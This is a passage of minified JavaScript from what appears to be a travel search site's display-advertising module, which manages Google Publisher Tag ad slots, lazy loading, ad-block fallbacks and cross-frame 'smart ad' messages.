      a && a.adDivId && (this.config.mobileNativeDisplay && delete this._loadedNonNativeSlots[a.adDivId], this.pendingSlotInfo = this.pendingSlotInfo.filter(function (b) {
        return b && b.adDivId !== a.adDivId;
      }), Object.keys(this.registeredSlots).forEach(function (c) {
        c && b.registeredSlots[c] && b.registeredSlots[c].adDivId === a.adDivId && delete b.registeredSlots[c];
      }), this.destroyDefinedSlot(a.adDivId));
    }, e.prototype.onResultsPageAdsPoll = function () {
      var a = this;
      this.options.deferUserInteractMS && !C(this.definedSlots) && (this.deferUserInteractID && clearTimeout(this.deferUserInteractID), this.deferUserInteractID = setTimeout(function () {
        a.deferUserInteractID = null;
      }, this.options.deferUserInteractMS));
    }, e.prototype.loadGPT = function () {
      this.loadedGPT || (this.loadedGPT = !0, K.getInstance().loadGPT(this.config.gptLoadOnce));
    }, e.prototype.onResultsPageAdsUpdate = function (a) {
      var b = this;
      if (this.enabled) {
        var c = new K(),
          d = c.findAdDataForType("displayAd", "middle", a);
        if (this._adsData = a, this._middleConfig = {
          slotData: d
        }, this.pendingSlotInfo && this.pendingSlotInfo.length && this.pendingSlotInfo.forEach(function (d) {
          if (d) {
            var f = c.findAdDataForType("displayAd", d.pageLocation, a);
            f && f.adBlockOptions && f.adBlockOptions.origin && b._hasSlots && 0 <= b.slots.indexOf(b.makeSlotKey(f)) && b.updateSlotDataAndLoad(b._updateAdOptions(d, f));
          }
        }), this.pendingSlotInfo.length && (this.pendingSlotInfo = this.pendingSlotInfo.filter(function (a) {
          var c = b.registeredSlots;
          return !Object.keys(c).some(function (b) {
            b = c[b];
            return !b || a.adDivId === b.adDivId;
          });
        })), this.pendingSlotInfo.length && C(this.registeredSlots) && this.pendingSlotInfo.some(function (a) {
          return a && !a.isAvoidResults;
        }) && this._hasSlots) this.publishAllAdsRequests();else {
          var f = this.registeredSlots;
          Object.keys(f).forEach(function (d) {
            d = f[d];
            var m = c.findAdDataForType("displayAd", d.pageLocation, a);
            m && b.updateSlotDataAndLoad(b._updateAdOptions(d, m));
          });
        }
      }
    }, e.prototype.onDynamicSlotsInject = function (a) {
      var b = this;
      this.config.mobileNativeDisplay && a && this === a.owner && (this.allSlotsRegistered = !1, a.slots.forEach(function (a) {
        0 > b.slots.indexOf(a) && b.slots.push(a);
      }));
    }, e.prototype.onDynamicSlotsDestroy = function (a) {
      var b = this;
      if (this.config.mobileNativeDisplay && a && this === a.owner) {
        var c = this.slots,
          d = c.length;
        d && a.slots.forEach(function (a) {
          var f = a.slotKey;
          if (f) for (var e = d - 1; 0 <= e; e--) c[e] === f && c.splice(e, 1);
          delete b._loadedNativeSlots[a.pageLocation];
        });
      }
    }, e.prototype.onSraSlotsBroadcast = function (a) {
      a && this !== a.owner && Array.isArray(a.slots) && (this.slots = this.slots.filter(function (b) {
        return 0 > a.slots.indexOf(b);
      }), 1 > this.slots.length && (this._hasSlots = !1, this.cleanupSlots(), this.registeredSlots = {}, this.pendingSlotInfo = [], this.allSlotsRegistered = !1, this.enabled = !1));
    }, e.prototype.onAdBlockDetected = function () {
      this.adBlocked || (this.adBlocked = !0, this.replaceAllAdBlockedSlots());
    }, e.prototype.onSraSlotRegisterEvent = function (a) {
      a && a.adDivId ? a.adBlockOptions ? (this.augmentPageOptions(a), a.adBlockOptions.origin ? this.updateSlotDataAndLoad(a) : this.handleMissingOrigin(a.gptAdID)) : a.isAvoidResults ? this.logError("No ad targeting for non-results ad") : (this.pendingSlotInfo.push(a), this.publishOneAdsRequest(a)) : this.logError("Missing adOptions ID");
    }, e.prototype.publishOneAdsRequest = function (a) {
      a && !a.isAvoidResults && t.getInstance().onAdsRequest({
        adType: "displayAd",
        pageLocation: a.pageLocation,
        now: !a.gptAdID,
        events: ["searchform.submit", "resultsHeader.changed", "filters.changed", "paginator.change"],
        minRefreshRate: this.options.minRefreshRate
      });
    }, e.prototype.augmentPageOptions = function (a) {
      a && a.pageOptions && (void 0 === a.pageOptions.xp && (a.pageOptions.xp = ""), a.isAvoidResults && void 0 === a.pageOptions.host && (a.pageOptions.host = "http://" + window.location.hostname));
    }, e.prototype.handleMissingOrigin = function (a) {
      this.loggedMissingParams || (this.loggedMissingParams = !0, a && this.logError("Ad params without origin"));
    }, e.prototype.cleanupSlots = function () {
      var a = this;
      this.boundSlotRenderedListener = this.pageTargetingLast = null;
      this.intersectionObserver && (this.intersectionObserver.disconnect(), this.intersectionObserver = null, this.useSlotGroups = this._isUseSlotGroupsEnabled(), this.observingSlots = null, this.slotsWithSlotGroup = null, this.waitingSlotGroups = null);
      window.googletag && googletag.cmd && googletag.cmd.push(function () {
        var b = [];
        Object.keys(a.definedSlots).forEach(function (c) {
          b.push(a.definedSlots[c]);
          delete a.definedSlots[c];
        });
        b.length && googletag.destroySlots(b);
        a.definedSlots = {};
        a.allSlotsLoaded = !1;
      });
    }, e.prototype.updateSlotDataAndLoad = function (a) {
      var b = this;
      if (a && a.adBlockOptions && a.adDivId && (a = q({
        slotKey: this.makeSlotKey(a),
        adSize: H(a),
        adDivId: a.adDivId,
        smartAd: null
      }, a)).slotKey && this._hasSlots && !(0 > this.slots.indexOf(a.slotKey))) {
        var c = this.registeredSlots[a.slotKey];
        if (c && c.adDivId !== a.adDivId && this.definedSlots[c.adDivId] && this.destroyDefinedSlot(c.adDivId), this.registeredSlots[a.slotKey] = q({}, a), !this.allSlotsRegistered && 0 < this.options.slotsLoadedTimerMS) (a = this.allSlotsRegisteredTimerID) && clearTimeout(a), this.allSlotsRegisteredTimerID = setTimeout(function () {
          G.getInstance().isBlocked() || b.setAllSlotsRegistered();
        }, this.options.slotsLoadedTimerMS);
        this.checkLoadSlots();
      }
    }, e.prototype.makeSlotKey = function (a) {
      var b = this.options.slotKeyDelim,
        b = b + a.pageLocation + b,
        c = a.adBlockOptions;
      c && (b += c.origin);
      a = H(a);
      if (!a) return "x" + b;
      c = a[0];
      return Array.isArray(c) ? c[0] + "x" + c[1] + b : c + "x" + a[1] + b;
    }, e.prototype.handleDelayedSlotLoad = function (a, b) {
      var c = this;
      this.delayedSlotLoadID && clearTimeout(this.delayedSlotLoadID);
      this.delayedSlotLoadID = setTimeout(function () {
        a && (c.delayedGptApiCt += 1, 100 <= c.delayedGptApiCt) ? 100 !== c.delayedGptApiCt || G.getInstance().isBlocked() || A.getInstance().sendUserEvent("sra", "error", "gptapi") : c.loadAllSlots(b);
      }, 200);
    }, e.prototype.checkLoadSlots = function () {
      if (this.enabled && this._hasSlots) {
        if (this.dynamicOptions.checkRegisteredSlotMatch) for (var a = 0; a < this.slots.length; a++) {
          var b = this.slots[a];
          if (b && !this.registeredSlots[b]) return;
        } else if (!this.registeredSlots || C(this.registeredSlots)) return;
        this.setAllSlotsRegistered();
      }
    }, e.prototype.hasSlots = function () {
      return this._hasSlots;
    }, e.prototype.setAllSlotsRegistered = function () {
      this.allSlotsRegistered = !0;
      var a = this.allSlotsRegisteredTimerID;
      a && clearTimeout(a);
      this.loadAllSlots(!1);
    }, e.prototype.loadAllSlots = function (a) {
      if (this.enabled) if (this.adBlocked) this.replaceAllAdBlockedSlots();else {
        var b = window.googletag;
        if (b && b.apiReady) {
          if (!a) return this.deferUserInteractID ? void this.handleDelayedSlotLoad(!1, !1) : void this.handleDelayedSlotLoad(!1, !0);
          this.setupAllSlots();
          this.allSlotsLoaded = !0;
        } else this.handleDelayedSlotLoad(!0, !1);
      }
    }, e.prototype.destroyDefinedSlot = function (a) {
      var b = this,
        c = window.googletag;
      c && c.cmd.push(function () {
        b._unobserveSlot(a);
        c.destroySlots([b.definedSlots[a]]);
        delete b.definedSlots[a];
      });
    }, e.prototype.publishAllAdsRequests = function () {
      var a = [];
      this.pendingSlotInfo && this.pendingSlotInfo.length && (a = this.pendingSlotInfo.filter(function (a) {
        return a && !a.isAvoidResults;
      }));
      var b = this.registeredSlots;
      (a = a.concat(Object.keys(b).map(function (a) {
        return (a = b[a]) && !a.isAvoidResults ? a : null;
      }))).forEach(this.publishOneAdsRequest.bind(this));
    }, e.prototype.replaceAllAdBlockedSlots = function () {
      var a = this;
      if (this.enabled) {
        var b = this.registeredSlots;
        Object.keys(b).forEach(function (c) {
          a.replaceAdBlockedContent(b[c]);
        });
      }
    }, e.prototype.replaceAdBlockedContent = function (a) {
      var b = this.getComponentByDivId(a && a.adDivId);
      if (b && a.adBlockedURL && a.gptAdID) {
        var c = H(a),
          d = "";
        Array.isArray(c) && (d = (d = c[0]) && Array.isArray(d) ? " width\x3d'" + d[0] + "' height\x3d'" + d[1] + "'" : " width\x3d'" + d + "' height\x3d'" + c[1] + "'");
        b.innerHTML = "\x3ciframe class\x3d'had-frame' frameborder\x3d'0'" + d + " scrolling\x3d'no' src\x3d'" + a.adBlockedURL + "'\x3e\x3c/iframe\x3e";
      } else b && (b.style.display = "none");
    }, e.prototype.setWindowEvents = function () {
      var a = this,
        b = {},
        c = this.registeredSlots;
      Object.keys(c).forEach(function (a) {
        if ((a = c[a]) && a.adBlockOptions && a.adBlockOptions.pos && a.adBlockOptions.origin) {
          var d = a.adBlockOptions.origin.match(/\w+\.\w*\.(\w+)\./);
          d && 1 < d.length && d[1] && (b[d[1] + "." + a.adBlockOptions.pos + ".NoAd"] = q({}, a));
        }
      });
      this.dfpHideData = b;
      this._windowEventListener && window.removeEventListener("message", this._windowEventListener);
      this._windowEventListener = function (b) {
        a.onWindowMessage(b);
      };
      window.addEventListener("message", this._windowEventListener);
    }, e.prototype.onWindowMessage = function (a) {
      var b = this;
      if (this.enabled && a) {
        var c = window.location,
          d = this.options,
          f = d.smartAdWinMessageHosts,
          f = f && f.replace(/(http(s)?:)?\/\//g, c.protocol + "//"),
          f = f + ("," + c.protocol + "//" + c.host),
          c = a.data;
        if (this.dfpHideData && c && this.dfpHideData[c]) (a = this.dfpHideData[c]) && a.adDivId && ((f = this.getComponentByDivId(a.adDivId)) && (f.style.display = "none"), !1 !== this.config.trackCollapse && A.getInstance().sendUserEvent("sra", "adcollapse", a.pageLocation));else {
          var m = d.smartAdWinMessageID,
            d = d.smartAdWinMessageHostsRegExp;
          if (a.origin && (f.includes(a.origin) || d && a.origin.match(d)) && m && c[m]) {
            var e = c[m],
              g = e.pos;
            if (g) {
              var h = this.registeredSlots;
              return void Object.keys(h).forEach(function (a) {
                a = h[a];
                a.adBlockOptions && g === a.adBlockOptions.pos && b.kickoffSmartAd(e, a);
              });
            }
            this.logError("No pos for smartad data", g);
          }
        }
      }
    }, e.prototype.setupPageTargeting = function (a) {
      var b = window.googletag;
      b.pubads().clearTargeting();
      b.pubads().enableSingleRequest();
      var c = this.options;
      if (c.gptIframeTitle && b.setAdIframeTitle(c.gptIframeTitle), c.isForceSafeFrame && b.pubads().setForceSafeFrame(!0), this._setupPrivacyProcessing(), c.lazyLoad) {
        var d = {};
        !isNaN(c.lazyFetch) && -1 <= c.lazyFetch && (d.fetchMarginPercent = c.lazyFetch);
        !isNaN(c.lazyRender) && -1 <= c.lazyRender && (d.renderMarginPercent = c.lazyRender);
        b.pubads().enableLazyLoad(d);
      }
      a.gptPageURL && b.pubads().set("page_url", a.gptPageURL);
      b.pubads().collapseEmptyDivs();
      var f = a.pageOptions;
      Object.keys(f).forEach(function (a) {
        a && b.pubads().setTargeting(a, f[a]);
      });
    }, e.prototype.onSlotRenderedEvent = function (a) {
      this.enabled && (t.getInstance().onDisplayLoaded(a.slot.getSlotElementId(), a.isEmpty), !0 === this.dynamicOptions.renderIfNotEmpty && !1 === a.isEmpty) && (a = this.getComponentByDivId(a.slot.getSlotElementId())) && (a.style.display = "block");
    }, e.prototype.setupAllSlots = function () {
      var a,
        b = this,
        c = this.registeredSlots;
      Object.keys(c).forEach(function (d) {
        d = c[d];
        !d || b.pageTargetingLast && S(b.pageTargetingLast, d.pageOptions, ["tile"]) || (b.pageTargetingLast = q({}, d.pageOptions), a = d);
      });
      this.pageTargetingLast ? "function" == typeof googletag.pubads ? (this.setWindowEvents(), googletag.cmd.push(function () {
        a && b.setupPageTargeting(a);
        b.boundSlotRenderedListener || (b.boundSlotRenderedListener = b.onSlotRenderedEvent.bind(b), googletag.pubads().addEventListener("slotRenderEnded", b.boundSlotRenderedListener));
        var c = b.allSlotsLoaded,
          f = b.registeredSlots;
        Object.keys(f).forEach(function (a) {
          a = f[a];
          (a && b.setupSlot(a), c) && (a = b.getComponentByDivId(a.adDivId)) && (a.style.display = "block");
        });
        c ? b.useSlotGroups ? b._useSlotGroups() : googletag.pubads().refresh() : (b.useSlotGroups && googletag.pubads().disableInitialLoad(), googletag.enableServices(), Object.keys(b.definedSlots).forEach(function (a) {
          a && googletag.display(a);
        }), b.useSlotGroups && b._useSlotGroups());
      })) : this.logError("Bad googletag pubads") : this.errPageOptions || (this.errPageOptions = !0, this.logError("Missing slot data page options"));
    }, e.prototype.setupSlot = function (a) {
      if (a && a.adDivId && a.adBlockOptions) {
        var b = a.adDivId,
          c = this.definedSlots[b],
          d = !1;
        if (!c) var d = !0,
          f = this.config.mobileNativeDisplay && D(a.pageLocation) ? ["fluid"] : a.adSize,
          c = googletag.defineSlot(a.gptTargetID, f, b);
        if (!c) return this.errSlotDefine || (this.errSlotDefine = !0, this.logError("defineSlot failed", b, this.slots, this.registeredSlots, this.definedSlots, document.getElementById(b), a)), void t.getInstance().onDisplayLoadFailed(b);
        this.config.lazyLoadSlotGroups ? this.setupSlotGroupObserver(a) && (this.useSlotGroups = !0) : this.config.loadDefaultSlotGroupOnInit && a.slotGroup && 0 < a.slotGroup && d && (this.slotsWithSlotGroup = this.slotsWithSlotGroup || {}, this.slotsWithSlotGroup[a.adDivId] = !0);
        c.clearTargeting();
        var e = a.adBlockOptions;
        Object.keys(e).forEach(function (a) {
          a && c.setTargeting(a, e[a]);
        });
        d && (c.addService(googletag.pubads()), this.definedSlots[b] = c);
      } else this.errSlotOptions || (this.errSlotOptions = !0, this.logError("Missing slot ID or data ad options"));
    }, e.prototype.setupSlotGroupObserver = function (a) {
      if (!(a.slotGroup && "IntersectionObserver" in window)) return !1;
      var b = document.getElementById(a.adDivId);
      return !!b && (this.config.mobileNativeDisplay && this._loadedNativeSlots[a.pageLocation] || (this.intersectionObserver || (this.intersectionObserver = new IntersectionObserver(this.onObserverEvent.bind(this), {
        root: null,
        threshold: .1
      }), this.observingSlots = {}), this.observingSlots && !this.observingSlots.hasOwnProperty(a.adDivId) && (this.observingSlots[a.adDivId] = !1, this.intersectionObserver.observe(b))), !0);
    }, e.prototype.onObserverEvent = function (a) {
      var b = this.observingSlots;
      b && a && a.forEach(function (a) {
        if (a) {
          var c = a.target;
          c && (c = c.id) && (b[c] = a.isIntersecting);
        }
      });
      this.refreshSlotGroups();
    }, e.prototype.refreshSlotGroups = function () {
      var a = this,
        b = this.waitingSlotGroups;
      if (b) {
        var c = q(q({}, this.observingSlots), this.slotsWithSlotGroup);
        if (C(c)) this.waitingSlotGroups = b || !0;else if (c = function (a, b, c) {
          return Object.keys(a).filter(function (c) {
            return (c = a[c]) && b[c.adDivId];
          }).map(function (b) {
            return a[b].slotGroup || -1;
          }).filter(function (a, b, d) {
            return d.indexOf(a) === b && (!0 === c || 0 <= c.indexOf(a));
          });
        }(this.registeredSlots, c, b), c.length) {
          var d = I(c, this.registeredSlots),
            f = J(d, this.registeredSlots, this.definedSlots),
            e = function (a, b) {
              return Object.keys(a).filter(function (c) {
                return 0 > b.indexOf(a[c].slotGroup || -1);
              }).map(function (b) {
                return a[b].slotGroup || -1;
              }).filter(function (a, b, c) {
                return c.indexOf(a) === b;
              });
            }(this.registeredSlots, c);
          if (e.length ? !0 === b ? this.waitingSlotGroups = e : (this.waitingSlotGroups = b.filter(function (a) {
            return 0 <= e.indexOf(a);
          }), b.length || (this.waitingSlotGroups = !1)) : this.waitingSlotGroups = !1, f.length) {
            var g = window.googletag;
            g.cmd.push(function () {
              g.pubads().refresh(f);
            });
            this.config.mobileNativeDisplay && d.forEach(function (b) {
              if (b = a.registeredSlots[b]) {
                var c = b.pageLocation;
                D(c) && (a._loadedNativeSlots[c] = !0, a._unobserveSlot(b.adDivId));
              }
            });
            this.config.loadDefaultSlotGroupOnInit && null !== this.slotsWithSlotGroup && (this.slotsWithSlotGroup = null);
          }
        }
      }
    }, e.prototype.sanitizeParams = function (a) {
      var b = this;
      Object.entries(a).forEach(function (c) {
        var d = c[0];
        (c = c[1]) && "string" == typeof c && (a[d] = c.replace(b._maliciousPattern, ""));
      });
    }, e.prototype.kickoffSmartAd = function (a, b) {
      if (!1 !== this.config.loadSmartAd && a && b && b.adDivId) {
        if (this.sanitizeParams(a), !a.searchid) {
          var c = this.options;
          a.searchid = c.pageOptions ? c.pageOptions.searchid : void 0;
        }
        if (a.provider_code && a.searchid) if (c = this.getSmartAdURL(a, !0)) {
          this.boundWindowSmartAdResize || (this.boundWindowSmartAdResize = this.onSmartAdGlobalResize.bind(this), window.resizeIframeToContents = this.boundWindowSmartAdResize);
          var d,
            f,
            e = window.R9 || {};
          (window.R9 = e).Ads = e.Ads || {};
          e.Ads.SmartAd = e.Ads.SmartAd || {
            slots: {
              R0: {},
              R1: {},
              M0: {}
            },
            adjustBannerContainerSize: function () {}
          };
          e = b.adBlockOptions && b.adBlockOptions.origin;
          if ("string" == typeof a.sz) {
            var g = a.sz.split("x");
            g && 2 === g.length && parseInt(g[0], 10) && parseInt(g[1], 10) && (d = g[0], f = g[1]);
          }
          b.smartAd = q({
            rank: b.gptAdID ? b.gptAdID.substr(b.gptAdID.length - 1, 1) : null,
            origin: e && 1 < e.length ? e.substr(e.length - 2, 2) : null,
            reloaded: !1,
            sized: !1
          }, a);
          this.searchCompleteListenerId || (this.searchCompleteListenerId = F.getInstance().addSearchCompleteListener(this.onSearchComplete.bind(this)));
          if (a = this.getComponentByDivId(b.adDivId)) e = document.createElement("iframe"), e.id = this._getIframeId(b.adDivId), e.className = "smartad-frame", e.frameBorder = "0", d && (e.width = d), f && (e.height = f), e.scrolling = "no", e.src = c, a.innerHTML = "", a.appendChild(e);
        } else A.getInstance().sendUserEvent("smartad", "urlfail", b.pageLocation);
      }
    }, e.prototype.onSmartAdGlobalResize = function () {
      var a = this,
        b = this.registeredSlots;
      Object.keys(b).forEach(function (c) {
        a.resizeSmartAd(b[c]);
      });
    }, e.prototype.resizeSmartAd = function (a) {
      if (a && a.adDivId && a.smartAd && !a.smartAd.sized) {
        var b = this.getComponentByDivId(a.adDivId),
          c = this.getComponentByDivId(this._getIframeId(a.adDivId));
        if (c) {
          var d = c.contentDocument;
          if (!d) {
            var f = c.contentWindow;
            f && (d = f.document);
          }
          if (d) {
            a.smartAd.sized = !0;
            a = c.offsetWidth;
            var f = c.offsetHeight,
              e = d.body.clientWidth,
              d = d.body.clientHeight;
            2 > e || 2 > d ? b && (b.style.display = "none") : (a !== e && c.setAttribute("width", e + "px"), f !== d && c.setAttribute("height", d + "px"), b && (b.offsetWidth !== e && (b.setAttribute("width", "auto"), b.setAttribute("max-width", "none")), b.offsetHeight !== d && (b.setAttribute("height", "auto"), b.setAttribute("max-height", "none"))));
          }
        }
      }
    }, e.prototype.onSearchComplete = function () {
      var a = this,
        b = this.searchCompleteListenerId;
      b && (this.searchCompleteListenerId = void 0, F.getInstance().removeSearchCompleteListener(b));
      var c = this.registeredSlots;
      Object.keys(c).forEach(function (b) {
        var d = c[b];
        d && (b = d.smartAd) && !b.reloaded && (b.reloaded = !0, b.sized = !1, setTimeout(function () {
          var b = d.smartAd;
          if (b) {
            var c = a.getComponentByDivId(a._getIframeId(d.adDivId));
            c && (b = a.getSmartAdURL(b, !1) + "\x26reload\x3d1", c.setAttribute("src", b));
          }
        }, 100));
      });
    }, e.prototype.getSmartAdURL = function (a, b) {
      if (a) {
        var c = a.provider_code,
          d = a.click_tracking,
          e = a.sz;
        return "/h/ads/smartad?provider_code\x3d" + (c ? encodeURIComponent(c) : "") + "\x26searchid\x3d" + a.searchid + "\x26clicktracking\x3d" + (d ? encodeURIComponent(d) : "") + "\x26sz\x3d" + (e ? encodeURIComponent(e) : "") + "\x26rank\x3d" + a.rank || "0\x26logimpr\x3d" + b + "\x26strm\x3d\x26pageorigin_location\x3d" + a.origin || "R0\x26isstreaming\x3d";
      }
    }, e.prototype.logError = function (a) {
      for (var b, c = [], d = 1; d < arguments.length; d++) c[d - 1] = arguments[d];
      !1 !== this.config.logErrors && (b = g()).error.apply(b, M(["kn-display: " + a], c));
    }, e.prototype.getComponentByDivId = function (a) {
      return a ? window.document.getElementById(a) : null;
    }, e.prototype.registerInlineDisplayAd = function (a) {
      var b = this;
      if (a && a.pageLocation) {
        Object.keys(this.registeredSlots).forEach(function (c) {
          c && b.registeredSlots[c] && b.registeredSlots[c].pageLocation === a.pageLocation && b.onSraSlotDestroyEvent(b.registeredSlots[c]);
        });
        var c = this._middleConfig && this._middleConfig.slotData;
        c && c.adBlockOptions && c.adBlockOptions.origin && this._hasSlots && 0 <= this.slots.indexOf(this.makeSlotKey(c)) && this.updateSlotDataAndLoad(this._updateAdOptions(a, c));
      }
    }, e.prototype.registerIndependentDisplayAd = function (a, b, c, d, e) {
      var f = this;
      a && a.pageLocation && (this._adsData ? this.handleIndependent(a) : z.getInstance().request(v.getConfig(b, c, d, e), function (b) {
        200 === b.status && (b = b.data, b.success && (f._adsData = v.apiResponseToAdsData(b), f.handleIndependent(a)));
      }, function (a, b) {
        a || f.logError("Failed to get Display config", b);
      }));
    }, e.prototype.handleIndependent = function (a) {
      var b = this;
      Object.keys(this.registeredSlots).forEach(function (c) {
        c && b.registeredSlots[c] && b.registeredSlots[c].pageLocation === a.pageLocation && b.onSraSlotDestroyEvent(b.registeredSlots[c]);
      });
      var c = new K().findAdDataForType("displayAd", a.pageLocation, this._adsData);
      c && c.adBlockOptions && c.adBlockOptions.origin && this._hasSlots && 0 <= this.slots.indexOf(this.makeSlotKey(c)) && this.updateSlotDataAndLoad(this._updateAdOptions(a, c));
    }, e.prototype._getIframeId = function (a) {
      return a + "-smartad-frame";
    }, e.prototype._setupPrivacyProcessing = function () {
      this.options.dataSharingOptOut && googletag.pubads().setPrivacySettings({
        restrictDataProcessing: !0
      });
    }, e.prototype._unobserveSlot = function (a) {
      if (this.definedSlots && this.definedSlots[a]) {
        if (this.intersectionObserver) {
          var b = window.document.getElementById(a);
          b && this.intersectionObserver.unobserve(b);
        }
        this.observingSlots && this.observingSlots.hasOwnProperty(a) && delete this.observingSlots[a];
      }
    }, e.prototype._isUseSlotGroupsEnabled = function () {
      return !!this.config.mobileNativeDisplay || !!this.config.loadDefaultSlotGroupOnInit;
    }, e.prototype._useSlotGroups = function () {
      var a = this,
        b = this.config;
      b.mobileNativeDisplay && (d = J(c = I([0], this.registeredSlots).filter(function (b) {
        b = a.registeredSlots[b];
        return !a._loadedNonNativeSlots[b.adDivId] && !D(b.pageLocation);
      }), this.registeredSlots, this.definedSlots)).length && (googletag.pubads().refresh(d), c.forEach(function (b) {
        a._loadedNonNativeSlots[a.registeredSlots[b].adDivId] = !0;
      }));
      var c, d;
      c = this._middleConfig && this._middleConfig.slotData;
      b.loadDefaultSlotGroupOnInit && c !== this._zeroSlotGroupReloadedWithMiddleConfig && (this._zeroSlotGroupReloadedWithMiddleConfig = c, (d = J(c = I([0], this.registeredSlots), this.registeredSlots, this.definedSlots)).length && googletag.pubads().refresh(d));
      this.waitingSlotGroups = !0;
      this.refreshSlotGroups();
    }, e.prototype._updateAdOptions = function (a, b) {
      return Object.keys({
        gptAdID: null,
        gptTargetID: null,
        gptAdWidth: null,
        gptAdHeight: null,
        gptAdSizes: null,
        gptPageURL: null,
        adBlockOptions: null,
        pageOptions: null,
        slotGroup: 0
      }).forEach(function (c) {
        b.hasOwnProperty(c) && void 0 !== b[c] && (a[c] = b[c]);
      }), this.augmentPageOptions(a), a;
    }, e);
  (k = h.CLIENT || (h.CLIENT = {})).MWEB = "mweb";
  k.DESKTOP = "desktop";
  k.OSIRIS = "osiris";
  k.UNKNOWN = "unknown";
  (k = h.AD_TYPE || (h.AD_TYPE = {})).DISPLAY_AD = "displayAd";
  k.TEXT_AD = "textAd";
  (k = h.Vertical || (h.Vertical = {})).FLIGHTS = "flights";
  k.HOTELS = "hotels";
  k.CARS = "cars";
  k.PACKAGES = "packages";
  (k = h.AdPage || (h.AdPage = {})).MOBILE = "mobile";
  k.RESULTS = "results";
  k.SEARCH = "search";
  k.FRONTDOOR = "frontdoor";
  k.MOBILE_RESULTS = "mwebresults";
  k.TABLET_RESULTS = "twebresults";
  k.MOBILE_NATIVE_INLINE = "mwebnativeinline";
  (k = h.AD_POSITION || (h.AD_POSITION = {})).BOTTOM = "bottom";
  k.UPPER_RIGHT = "upper-right";
  k.BOTTOM_LEFT = "bottom-left";
  k.RIGHT = "right";
  k.RIGHT_BOTTOM = "right-bottom";
  k.LEFT = "left";
  k.LOWER_MIDDLE = "lower-middle";
  k.MIDDLE = "middle";
  k.TOP = "top";
  h.DisplayList = v;
  h.checkBlocked = function () {
    return G.isBlockedAsPromise();
  };
  h.getDisplaySra = function (a, b, c, d) {
    return new T(a, b, c, d);
  };
  h.getNativeAdPosition = function (a, b) {
    return "inline-page" + a + "-slot" + (b + 1);
  };
  h.setModuleConfig = function (a) {
    var b = a.ajax;
    b && z.getInstance().setMethod(b);
    (b = a.logger) && L.getInstance().setLogger(b);
    var b = Q.getInstance(),
      c = a.client;
    c && b.setClient(c);
    (c = a.blockerDetector) && b.setBlockerDetector(c);
    (b = a.sendUserEvent) && A.getInstance().setSendUserEvent(b);
    b = F.getInstance();
    (c = a.addSearchCompleteListener) && b.setAddSearchCompleteListener(c);
    (c = a.removeSearchCompleteListener) && b.setRemoveSearchCompleteListener(c);
    b = t.getInstance();
    (c = a.onDisplayLoaded) && b.setOnDisplayLoaded(c);
    (c = a.onDisplayLoadFailed) && b.setOnDisplayLoadFailed(c);
    (c = a.onAdsRequest) && b.setOnAdsRequest(c);
    (c = a.onSraSlotsBroadcast) && b.setOnSraSlotsBroadcast(c);
    (c = a.onAdblockDetected) && b.setOnAdblockDetected(c);
    (c = a.onNativeDisplaysLoaded) && b.setOnNativeDisplaysLoaded(c);
    (a = a.onNoNativePlacementsFromGoogle) && b.setOnNoNativePlacementsFromGoogle(a);
  };
  Object.defineProperty(h, "__esModule", {
    value: !0
  });
});
(function (h, n) {
  h.createComponentClass("common.kn.KnDisplay", {
    options: {
      blockerDetector: null,
      sraConfig: null,
      sraOptions: null,
      sraDynamicOptions: null,
      slots: null,
      gptEnabled: null,
      renderPlaceholder: !1
    },
    init: function () {
      this.knDisplay = window["@r9/kn-display"];
      this.logger = new h.logger();
      this.knDisplay.setModuleConfig({
        logger: this.logger,
        onAdsRequest: this.onAdsRequest.bind(this),
        blockerDetector: this.options.blockerDetector,
        ajax: this.modulesAjaxRequest.bind(this),
        client: "desktop",
        addSearchCompleteListener: this.addSearchCompleteListener.bind(this),
        removeSearchCompleteListener: this.removeSearchCompleteListener.bind(this),
        sendUserEvent: this.sendUserEvent.bind(this),
        onSraSlotsBroadcast: this.onSraSlotsBroadcast.bind(this),
        onAdblockDetected: this.onAdBlockDetected.bind(this),
        onDisplayLoaded: function (g) {
          h.events.publish("displayad.loaded", {
            slotElementId: g
          });
          h.events.publish("displayads.finishloading", g);
        },
        onDisplayLoadFailed: function (g) {
          h.globals.testMode && h.events.publish("displayads.error", g);
        }
      });
      this.knDisplay.checkBlocked();
      this.displaySra = this.knDisplay.getDisplaySra(this.options.sraConfig, this.options.sraOptions, this.options.sraDynamicOptions, this.options.slots);
    },
    addEventHandlers: function () {
      this.displaySra.hasSlots() && (this.subscribe("displayad.sra.register", this.onSraSlotRegisterEvent.bind(this)), this.subscribe("displayad.sra.register.inlineDisplayAd", this.onSraSlotRegisterEventIndependent.bind(this)), this.subscribe("displayad.sra.register.independentDisplayAd", this.onSraSlotRegisterEventIndependentSlot.bind(this)), this.subscribe("displayad.sra.unregisterAll", this.unregisterAllSlots.bind(this)), this.subscribe("displayad.sra.destroy", this.onSraSlotDestroyEvent.bind(this)), this.subscribe("resultspage.adinfo.empty", this.publishAllAdsRequests.bind(this)), this.subscribe("resultspage.ads.update", this.onResultsPageAdsUpdate.bind(this)), this.subscribe("resultspage.ads.options", this.onResultsPageAdsPoll.bind(this)), this.subscribe("resultspage.ads.onSearchStart", this.onSearchStart.bind(this)), this.options.eventsEnable && this.options.eventsEnable.pop && this.options.eventsEnable.length && this.subscribe(this.options.eventsEnable, this.onSraEnable.bind(this)), this.options.eventsDisable && this.options.eventsDisable.pop && this.options.eventsDisable.length && this.subscribe(this.options.eventsDisable, this.onSraDisable.bind(this)));
    },
    inlineComponentsReady: function () {
      this.displaySra.init();
      this.options.sraDynamicOptions.deferGPTLoad && this.loadGPT();
    },
    onSraSlotRegisterEventIndependent: function (g) {
      this.options.renderPlaceholder ? h.events.publish("kn.display.render.placeholders") : this.displaySra.registerInlineDisplayAd(g);
    },
    onSraSlotRegisterEventIndependentSlot: function (g) {
      this.displaySra.registerIndependentDisplayAd(g.adOptions, g.vertical, g.searchId, g.adType, g.adsenseReq);
    },
    onAdsRequest: function (g) {
      h.events.publish("ads.request", g);
    },
    addSearchCompleteListener: function (g) {
      this.subscribe("resultspage.streaming.done", function () {
        g();
      });
      return Math.random();
    },
    removeSearchCompleteListener: function () {
      this.unsubscribe("resultspage.streaming.done");
    },
    loadGPT: function () {
      this.options.gptEnabled && this.displaySra.loadGPT();
    },
    onSraSlotDestroyEvent: function (g) {
      this.displaySra.onSraSlotDestroyEvent(g);
    },
    onSraSlotsBroadcast: function (g) {
      this.displaySra.onSraSlotsBroadcast(g);
    },
    onSraEnable: function () {
      this.displaySra.onSraEnable();
    },
    onSraDisable: function () {
      this.displaySra.onSraDisable();
    },
    onSraSlotRegisterEvent: function (g) {
